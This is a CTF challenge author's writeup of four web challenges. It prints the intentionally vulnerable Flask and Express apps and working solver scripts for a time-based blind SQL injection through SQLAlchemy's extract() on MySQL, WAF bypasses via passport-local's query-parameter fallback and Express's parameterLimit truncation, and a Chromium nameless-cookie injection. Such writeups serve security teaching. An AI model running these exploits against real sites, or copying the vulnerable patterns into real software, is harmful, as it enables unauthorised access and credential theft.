---
date: 2025-11-24T10:43:41+09:00
# description: ""
# image: ""
lastmod: 2025-11-24
showTableOfContents: false
# tags: ["",]
title: "Sknb Ctf Author Writeup"
type: "post"
---

This is the first time I made challenges for ctf. I made the challenges in the following.
- SQL Alchemist
- Auth Delegation
- Parse Parse Parse
- Your Name
I apologize for troubles about my challenges. Next time, I will check carefully in production environment.

# SQL Alchemist

The following is the challenge source code

app.py
```py
import datetime
import os
import random
from flask import Flask, request, session, render_template, redirect
from sqlalchemy import create_engine, extract, select, Column, Integer, String, Date
from sqlalchemy.orm import DeclarativeBase, Session


MYSQL_USER = os.environ["MYSQL_USER"]
MYSQL_PASSWORD = os.environ["MYSQL_PASSWORD"]
MYSQL_DATABASE = os.environ["MYSQL_DATABASE"]
FLAG = os.environ["GZCTF_FLAG"]
engine = create_engine(f"mysql+mysqlconnector://{MYSQL_USER}:{MYSQL_PASSWORD}@db/{MYSQL_DATABASE}")
app = Flask(__name__)

app.config["SECRET_KEY"] = random.randbytes(32).hex()

class Base(DeclarativeBase):
    pass


class User(Base):

    __tablename__ = "user"

    id = Column(Integer, primary_key=True)
    username = Column(String(length=255), unique=True)
    password = Column(String(length=255))
    timestamp = Column(Date)


Base.metadata.create_all(bind=engine)

def add_user(username, password):
    try:
        with Session(engine) as session:
            session.add(User(username=username, password=password, timestamp=datetime.datetime.now()))
            session.commit()
        return True
    except:
        return False

def find_user(username, password):
    try:
        with Session(engine) as session:
            stmt = select(User)\
                .where(User.username == username)\
                .where(User.password == password)
            user_data = session.scalars(stmt).one_or_none()
            if not user_data:
                return False
            return user_data
    except:
        return False

@app.get("/")
def index():
    if not session or not "username" in session.keys():
        return render_template("home.html", is_authenticated=False)
    username = session.get("username")
    return render_template("home.html", user=username, is_authenticated=True)

@app.get("/login")
def get_login_page():
    if not "message" in request.args.keys():
        return render_template("login.html")
    return render_template("login.html", message=request.args.get("message"))

@app.get("/register")
def get_register_page():
    if not "message" in request.args.keys():
        return render_template("register.html")
    return render_template("register.html", message=request.args.get("message"))

@app.get("/flag")
def get_flag():
    if not session or not "username" in session.keys():
        return "not authenticated"
    if session["username"] != "admin":
        return "you are not admin"
    return FLAG

@app.post("/login")
def login():
    data = request.form
    if not data:
        return redirect("/login?message=data not found")
    if not "username" in data.keys() or not "password" in data.keys():
        return redirect("/login?message=username or password not found")
    username = data.get("username")
    password = data.get("password")
    if not isinstance(username, str) or not isinstance(password, str):
        return redirect("/login?message=invalid request")

    user = find_user(username, password)
    if not user:
        return redirect("/login?message=invalid credentials")
    session["username"] = user.username
    return redirect("/")

@app.post("/register")
def register():
    data = request.form
    if not data:
        return redirect("/register?message=data not found")
    if not "username" in data.keys() or not "password" in data.keys():
        return redirect("/register?message=username or password not found")
    username = data["username"]
    password = data["password"]
    if find_user(username, password):
        return redirect("/register?message=user already exists")
    if not isinstance(username, str) or not isinstance(password, str):
        return redirect("/register?message=invalid request")

    if not add_user(username, password):
        return redirect("/register?message=something went wrong")
    return redirect("/login")

@app.post("/logout")
def logout():
    if not session or not "username" in session.keys():
        session.clear()
    return redirect("/login")

@app.post("/info")
def show_user():
    data = request.form
    if not data:
        return "data not found"
    if not "username" in data.keys() or not "field" in data.keys():
        return "username or field not found"
    username = data.get("username")
    field = data.get("field")
    if not isinstance(username, str) or not isinstance(field, str):
        return "invalid request"

    try:
        with Session(engine) as session:
            user_data = session.query(
                User.username,
                extract(field, User.timestamp)
            ).where(User.username == username).first()
            return str(user_data)
    except Exception:
        return "something went wrong"

def init():
    if not add_user("admin", random.randbytes(16).hex()):
        print("something went wrong during user init")
    app.run(host="0.0.0.0", port=3000)

init()
```

Since admin can get flag, the goal is to login as admin. However, the admin password is randomized so leaking the admin password is needed. Looking at the source code, extract function is called when making a request to /info.

app.py
```py {linenos=inline lineNoStart=125 hl_lines=[17]}
@app.post("/info")
def show_user():
    data = request.form
    if not data:
        return "data not found"
    if not "username" in data.keys() or not "field" in data.keys():
        return "username or field not found"
    username = data.get("username")
    field = data.get("field")
    if not isinstance(username, str) or not isinstance(field, str):
        return "invalid request"

    try:
        with Session(engine) as session:
            user_data = session.query(
                User.username,
                extract(field, User.timestamp)
            ).where(User.username == username).first()
            return str(user_data)
    except Exception:
        return "something went wrong"
```

Looking at documentation, it says the following.

> This field is used as a literal SQL string. DO NOT PASS UNTRUSTED INPUT TO THIS STRING.
> 
> https://docs.sqlalchemy.org/en/20/core/sqlelement.html#sqlalchemy.sql.expression.extract

The source code of extract function is in the following.

https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/sql/compiler.py#L2939
```py {linenos=inline lineNoStart=2939}
    def visit_extract(self, extract, **kwargs):
        field = self.extract_map.get(extract.field, extract.field)
        return "EXTRACT(%s FROM %s)" % (
            field,
            extract.expr._compiler_dispatch(self, **kwargs),
        )
```

User input is used in EXTRACT statement without restrictions(including sanitizing) so it is possible to inject arbitary query. To see the output, change the source code like this.

app.py
```py {linenos=inline lineNoStart=138}
        with Session(engine) as session:
            stmt = session.query(
                User.username,
                extract(field, User.timestamp)
            ).where(User.username == username)
            return str(stmt)
```

The output is in the following.
```sh
curl -XPOST http://localhost:3000/info -d 'username=admin&field=hoge'

SELECT user.username AS user_username, EXTRACT(hoge FROM user.timestamp) AS anon_1
FROM user
WHERE user.username = %(username_1)s
```

With these information, it is possible to escape from current statement like the following query.

```sql
YEAR FROM user.timestamp), YOUR QUERY HERE, EXTRACT(year
```

## Solution

Here is solver

solve.py
```py
import argparse
import requests
import string


def parse_args():
    parser = argparse.ArgumentParser(conflict_handler="resolve")
    parser.add_argument("-u", "--url", help="base url of the app", type=str, required=True)
    return parser.parse_args()

def bruteforce(base_url, target_user, digit):
    target_column = "password"
    target_table = "user"
    sleep_duration = 3
    for c in string.ascii_letters + string.digits:
        query = f"YEAR FROM user.timestamp), (SELECT 1 FROM (SELECT IF(SUBSTR((SELECT {target_column} FROM {target_table} WHERE username = '{target_user}'),{digit},1) = '{c}',sleep({sleep_duration}),0))x), EXTRACT(year"
        try:
            requests.post(base_url + "/info", headers={
                "Content-Type": "application/x-www-form-urlencoded"
            }, data={
                "username": "admin",
                "field": query
            }, timeout=sleep_duration / 2)
        except:
            return c
    return False


if __name__ == "__main__":
    args = parse_args()
    base_url = args.url
    password_len = 32
    username = "admin"
    password = ""
    for i in range(password_len):
        c = bruteforce(base_url, username, i + 1)
        if not c:
            break
        password += c
        print(password)
    print(f"password: {password}")
    user = requests.Session()
    user.post(base_url + "/login", headers={
        "Content-Type": "application/x-www-form-urlencoded"
    }, data={
        "username": username,
        "password": password
    })
    res = user.get(base_url + "/flag")
    print(res.text)
```

```
python3 solve.py -u http://localhost:3000

a
ac
ac7
ac7d
ac7d8
ac7d84
ac7d84a
ac7d84ac
ac7d84acb
ac7d84acb9
ac7d84acb9e
ac7d84acb9ec
ac7d84acb9ecc
ac7d84acb9eccd
ac7d84acb9eccd7
ac7d84acb9eccd79
ac7d84acb9eccd793
ac7d84acb9eccd7933
ac7d84acb9eccd79332
ac7d84acb9eccd79332c
ac7d84acb9eccd79332c6
ac7d84acb9eccd79332c6d
ac7d84acb9eccd79332c6d9
ac7d84acb9eccd79332c6d92
ac7d84acb9eccd79332c6d926
ac7d84acb9eccd79332c6d926f
ac7d84acb9eccd79332c6d926f2
ac7d84acb9eccd79332c6d926f2a
ac7d84acb9eccd79332c6d926f2a9
ac7d84acb9eccd79332c6d926f2a97
ac7d84acb9eccd79332c6d926f2a97f
ac7d84acb9eccd79332c6d926f2a97fe
password: ac7d84acb9eccd79332c6d926f2a97fe
sknb{REDACTED}
```

## Trivia

This extract function's behavior can be found in certain databases. SQL Alchemy supports multiple databases, so each behavior is slightly different. For instance, SQLite's extract function doesn't allow SQL Injection since only the characters defined in extract_map are allowed.

https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/dialects/sqlite/base.py#L1466
```py {linenos=inline lineStartNo=1466}
    def visit_extract(self, extract, **kw):
        try:
            return "CAST(STRFTIME('%s', %s) AS INTEGER)" % (
                self.extract_map[extract.field],
                self.process(extract.expr, **kw),
            )
        except KeyError as err:
            raise exc.CompileError(
                "%s is not a valid extract argument." % extract.field
            ) from err
```

https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/dialects/sqlite/base.py#L1419
```py {linenos=inline lineStartNo=1419}
    extract_map = util.update_copy(
        compiler.SQLCompiler.extract_map,
        {
            "month": "%m",
            "day": "%d",
            "year": "%Y",
            "second": "%S",
            "hour": "%H",
            "doy": "%j",
            "minute": "%M",
            "epoch": "%s",
            "dow": "%w",
            "week": "%W",
        },
    )
```

# Auth Delegation

The following is the challenge source code.

app/src/index.js
```js
const crypto = require("crypto");
const express = require("express");
const session = require("express-session");
const passport = require("passport");

const app = express();
const port = 3000;

app.set("view engine", "ejs");

app.use(express.urlencoded(
    { extended: false }
));
app.use(session({
  secret: crypto.randomBytes(64).toString("hex"),
  resave: true,
  saveUninitialized: false,
}));

app.use(passport.initialize());
app.use(passport.session());

app.use("/", require("./routes/index"));

app.listen(port, console.log(`app is running on port ${port}`));
```

app/src/routes/index.js
```js
const express = require("express");
const passport = require("passport");


const LocalStrategy = require("passport-local").Strategy;
const router = express.Router();

const waf = (req, res, next) => {
  const { username } = req.body;
  if (!username) {
    next();
    return;
  }
  if (username === "admin") {
    res.redirect("/login?message=admin%20detected");
    return;
  }
  next();
}

passport.use(new LocalStrategy(
  (username, password, done) => {
    
    if (username === "admin" && password === "admin") {
      return done(null, { username: "admin" });
    }
    return done(null, false);
  }
));

passport.serializeUser((user, done) => {
  done(null, user);
});

passport.deserializeUser((user, done) => {
  done(null, user);
});

router.get("/", (req, res) => {
  if (!req.user) {
    res.redirect("/login");
    return;
  }
  if (req.user.username === "admin") {
    res.send(process.env.GZCTF_FLAG);
    return;
  }
  res.send("no flag for you");
});

router.get("/login", (req, res) => {
  const { message } = req.query;
  res.render("login.ejs", {
    message: message ? message : undefined,
  });
});

router.post("/login",
  waf,
  passport.authenticate("local",
    {
      failureRedirect : "/login",
      successRedirect : "/"
    }
  )
);

module.exports = router;
```

The goal is to get flag via logging in as admin. admin password is hardcoded in the source code.

app/src/routes/index.js
```js {lineNos=inline lineNoStart=21}
passport.use(new LocalStrategy(
  (username, password, done) => {
    
    if (username === "admin" && password === "admin") {
      return done(null, { username: "admin" });
    }
    return done(null, false);
  }
));
```
However, username admin is blocked by WAF.

app/src/routes/index.js
```js {lineNos=inline lineNoStart=8}
const waf = (req, res, next) => {
  const { username } = req.body;
  if (!username) {
    next();
    return;
  }
  if (username === "admin") {
    res.redirect("/login?message=admin%20detected");
    return;
  }
  next();
}
```
To log in as admin, the following situation is needed.
- waf sees username as something that is not admin
- web app sees username as admin

This web app uses Passport with LocalStrategy. Looking at the source of LocalStrategy, interesting code can be found.

https://github.com/jaredhanson/passport-local/blob/v1.0.0/lib/strategy.js#L71
```js {lineNos=inline lineNoStart=97}
var username = lookup(req.body, this._usernameField) || lookup(req.query, this._usernameField);
```
LocalStrategy actually retrieves username from query parameter if there isn't one in req.body. Since WAF is only looking at req.body.username and doesn't throw an error when req.body.username is null, it is possible to bypass WAF.

## Solution

Here is the solution.

solve.py
```py
import argparse
import requests


def parse_args():
    parser = argparse.ArgumentParser(conflict_handler="resolve")
    parser.add_argument("-u", "--url", help="base url of the app", type=str, required=True)
    return parser.parse_args()


args = parse_args()
base_url = args.url
ses = requests.Session()
ses.post(base_url + "/login?username=admin", headers={
    "Content-Type": "application/x-www-form-urlencoded"
}, data="password=admin")
res = ses.get(base_url + "/")
print(res.text)
```
```sh
python3 solve.py -u http://localhost:3000

sknb{REDACTED}
```

# Parse Parse Parse

The following is the challenge source code.

app/frontend/index.js
```js
const express = require("express");
const fs = require("node:fs");


const app = express();
const port = 3000;
const backendBaseUrl = "http://localhost";

const waf = (mode) => {
  if (mode) {
    return mode === "admin";
  }
  return false;
}

app.use(express.urlencoded({
  extended: false,
}));

app.get("/", async (req, res) => {
  const html = fs.readFileSync("./views/home.html").toString();
  res.send(html);
});

app.post("/", async (req, res) => {
  if (waf(req.query.user)) {
    res.send("no hacking");
    return;
  }
  const url = backendBaseUrl + req.url;
  const resp = await fetch(url);
  res.send(await resp.text());
});

app.listen(port, () => {
  console.log(`app is running on port ${port}`);
});
```

app/backend/src/index.ts
```ts
import { serve } from '@hono/node-server';
import { Hono } from 'hono';

const app = new Hono();

app.get('/', async (c) => {
  const user = c.req.query("user");
  if (!user) {
    return c.text("invalid request");
  }
  if (user !== "admin") {
    return c.text("this endpoint is only available to admin");
  }
  return c.text(process.env.GZCTF_FLAG || "sknb{REDACTED}");
});

serve({
  fetch: app.fetch,
  port: 80
}, (info) => {
  console.log(`Server is running on http://localhost:${info.port}`);
});
```
The goal is to retrieve the flag by setting req.query.user to admin, however WAF is blocking it in frontend.

app/frontend/index.js
```js {lineNos=inline lineStartNo=9}
const waf = (mode) => {
  if (mode) {
    return mode === "admin";
  }
  return false;
}
```

In frontend, it uses Express. In Express, it is possible to set max parameter size with parameterLimit(default: 1000). When the size of parameter is over parameterLimit, it truncates the value after length over parameterLimit.

> The issue here is that if I have a really long query param(over 1000) ie. test?ids[]=1&ids[]=2..., it will truncate the value after length over 1000. This is because the qs library has a default parameterLimit of 1000 which then it won't parse any more value after. It seems in express body parser, this issue also exists but it returns an error if it is over a limit.
> 
> https://github.com/expressjs/express/issues/5878

Since frontend has no null check on req.query.user, it is possible to bypass WAF.

## Solution

Here is solver.

solve.py
```py
import argparse
import requests
import urllib.parse


def parse_args():
    parser = argparse.ArgumentParser(conflict_handler="resolve")
    parser.add_argument("-u", "--url", help="base url of the app", type=str, required=True)
    return parser.parse_args()


args = parse_args()
base_url = args.url
query = "?"
for i in range(1001):
    query += f"dummy{i}=x&"
query += "user=admin"
res = requests.post(base_url + "/" + query)
print(res.text)
```
```sh
python3 solve.py -u http://localhost:3000

sknb{REDACTED}
```

# Your Name

The following is the challenge source code.

app/src/index.js
```js
const bodyParser = require('body-parser');
const express = require("express");


const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({
    extended: false,
}));
app.set("view engine", "ejs");

app.get("/report", (req, res) => {
    res.render("report.ejs");
});

app.post("/report", async (req, res) => {
    const { cookie } = req.body;
    const resp = await fetch("http://bot:3000/", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `cookie=${cookie}`,
    });
    res.send(await resp.text());
});

app.listen(port, console.log(`app is running on port ${port}`));
```

bot/src/index.js
```js
const express = require("express");
const puppeteer = require("puppeteer");


const app = express();
const port = 3000;

app.use(express.urlencoded({
    extended: false,
}));

const visit = async (cookie) => {
    const whitelist = /^[a-zA-Z0-9=;\/]+$/
    const cookies = cookie.split(";");
    for (const pair of cookies) {
        if (!whitelist.test(pair)) {
            return "invalid cookie detected";
        }
        if (pair.startsWith("flag=")) {
            return "invalid cookie detected";
        }
    }

    const browser = await puppeteer.launch({
        executablePath: "/usr/bin/chromium",
        headless: true,
        args: [
            "--no-sandbox",
            "--disable-gpu",
        ],
    });
    const context = await browser.createBrowserContext();
    await context.setCookie({
        domain: "localhost",
        name: "flag",
        value: "false",
    });
    const page = await context.newPage();
    await page.setDefaultTimeout(20000);

    try {
        // for generating document
        await page.goto("http://localhost:3000/flag");

        // set cookie
        await page.evaluate(c => document.cookie = c, cookie);

        const res = await page.goto("http://localhost:3000/flag");
        resp = await res.text();

        await page.close();
        await browser.close();
        return resp;
    } catch (e) {
        await page.close();
        await browser.close();
        return "something went wrong";
    }
}

app.post("/", async (req, res) => {
    const { cookie } = req.body;
    if (!cookie || typeof (cookie) !== "string") {
        res.send("invalid cookie");
        return;
    }
    const result = await visit(cookie);
    res.send(result);
});

app.get("/flag", (req, res) => {
    const cookieHeader = req.headers.cookie;
    if (!cookieHeader) {
        res.send("no cookies :(");
        return;
    }
    for (const cookie of cookieHeader.split(";")) {
        if (cookie === "flag=true") {
            res.send(process.env.GZCTF_FLAG);
            return;
        }
    }
    res.send("no flag for you");
});

app.listen(port, () => {
    console.log(`app is running on port ${port}`);
});
```
The goal is to set `flag=true` in bot's cookie. However, WAF is blocking it.

bot/src/index.js
```js {linenos=inline lineStartNo=13}
    const whitelist = /^[a-zA-Z0-9=;\/]+$/
    const cookies = cookie.split(";");
    for (const pair of cookies) {
        if (!whitelist.test(pair)) {
            return "invalid cookie detected";
        }
        if (pair.startsWith("flag=")) {
            return "invalid cookie detected";
        }
    }
```
WAF makes the following restrictions.
- only a-zA-Z0-9=;\/ can be used
- starting with flag= is prohibited

In chromium browser, there is an issue with nameless cookie. Nameless cookie is the cookie that has no name.
```
=value
```
When the browser parses the following nameless cookie, interesting behavior happens.
```
Set-Cookie: =key=value
```
The browser sets the cookie to Cookie header removing the first = character.
```
Cookie: key=value
```

> According to the latest versions of the rfc6265bis, nameless cookies are serialized without a leading =. 
> 
> https://issues.chromium.org/issues/40060539

So it is possible to set flag to true with the following cookie.
```
=flag=true
```
However, flag cookie is already set by visit function.

bot/src/index.js
```js {linenos=inline lineStartNo=33}
    await context.setCookie({
        domain: "localhost",
        name: "flag",
        value: "false",
    });
```

To solve this, put Path attribute to respect user's cookie.

> 2.  The user agent SHOULD sort the cookie-list in the following order:
       *  Cookies with longer paths are listed before cookies with
          shorter paths.
> 
> https://datatracker.ietf.org/doc/html/rfc6265#section-5.4

Final cookie is as follows.
```
=flag=true;Path=/flag
```

## Solution

Here is solver

solve.py
```py
import argparse
import requests


def parse_args():
    parser = argparse.ArgumentParser(conflict_handler="resolve")
    parser.add_argument("-u", "--url", help="base url of the app", type=str, required=True)
    return parser.parse_args()


args = parse_args()
base_url = args.url
res = requests.post(base_url + "/report", headers={
    "Content-Type": "application/x-www-form-urlencoded"
}, data="cookie==flag=true;Path=/flag")
print(res.text)
```
```sh
python3 solve.py -u http://localhost:3000

sknb{REDACTED}
```
